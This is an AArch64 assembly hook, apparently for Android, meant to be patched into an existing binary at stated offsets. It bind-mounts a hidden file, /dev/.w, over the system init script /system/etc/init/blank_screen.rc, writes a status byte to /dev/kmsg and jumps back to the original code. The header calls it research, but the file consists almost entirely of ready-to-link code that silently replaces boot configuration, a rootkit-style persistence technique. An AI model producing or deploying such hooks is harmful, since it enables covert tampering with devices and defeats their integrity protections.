// AArch64 Linux, activation-only research object. NOT a boot patch.
// Requires /dev/.w already preserved and readable. Does not create it.
// Suggested entry: successful branch at 0x6B6C8; return 0x6B6D8.
// Suggested placement: 0xA9F50, CONDITIONAL on loader mapping validation.
// Leaves x19-x30 and SIMD untouched; changes x0-x4,x8,NZCV.
// Stack restored. Original continuation reconstructs x0,x1,x8 and argv.
// kmsg record: W0 = mount success; W1 = mount failure (not errno).
// No record if kmsg open/write fails. No retries, no hidden success claim.
.arch armv8-a
.section .text.hook,"ax",@progbits
.balign 4
.global hook_activation
hook_activation:
    sub sp, sp, #16
    adr x0, source
    adr x1, target
    mov x2, xzr
    mov x3, #0x1000
    mov x4, xzr
    mov x8, #40
    svc #0
    cmp x0, #0
    cset w0, ne
    add w0, w0, #0x30
    mov w1, #0x57
    strb w1, [sp]
    strb w0, [sp, #1]
    mov w1, #10
    strb w1, [sp, #2]
    mov x0, #-100
    adr x1, kmsg
    mov x2, #1
    mov x3, xzr
    mov x8, #56
    svc #0
    tbnz x0, #63, done
    str x0, [sp, #8]
    mov x1, sp
    mov x2, #3
    mov x8, #64
    svc #0
    ldr x0, [sp, #8]
    mov x8, #57
    svc #0
 done:
    add sp, sp, #16
    b activation_return
 source: .asciz "/dev/.w"
 target: .asciz "/system/etc/init/blank_screen.rc"
 kmsg: .asciz "/dev/kmsg"
.global hook_end
hook_end:
// Link with activation_return=0x6B6D8 and text address chosen above.
